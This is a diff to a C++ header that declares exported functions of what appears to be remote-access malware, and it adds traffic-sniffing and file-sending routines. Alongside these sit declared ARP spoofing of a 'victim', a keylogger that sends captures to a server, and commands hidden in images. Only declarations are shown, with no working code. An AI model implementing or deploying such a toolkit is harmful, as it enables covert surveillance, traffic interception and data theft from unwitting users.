@@ -49,6 +49,8 @@ extern "C" {
 	extern __declspec(dllexport) string ChangeFile(string file);
 	extern __declspec(dllexport) string GetArpTable();
 	extern __declspec(dllexport) string SpoofVictim(std::string ip);
+	extern __declspec(dllexport) string SniffCurrentTraffic(std::string ip);
+	extern __declspec(dllexport) string StopSniffTraffic(string nothing);
 	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
 	extern __declspec(dllexport) string StartKeyLogger(string nothing);
 	extern __declspec(dllexport) string StartKeyLogger(string sharedKey);
@@ -62,6 +64,7 @@ extern "C" {
 /*
 Declarations of functions which are internal
 */
+string SniffTrafficWithThread(std::string ip);
 string exec(string cmd);
 string getFilePermissions(perms p);
 bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
@@ -79,6 +82,8 @@ bool SpecialKeys(int S_Key);
 void SendPicture(string fileName, string cmd);
 void SendKeyLoggerToServer(string sharedKey);
 string EncodeTextInsideImg(string fileName, string cmd);
+void SpoofVictimInThread(string ip);
+void SendFile(char * t);
 #endif
 
 
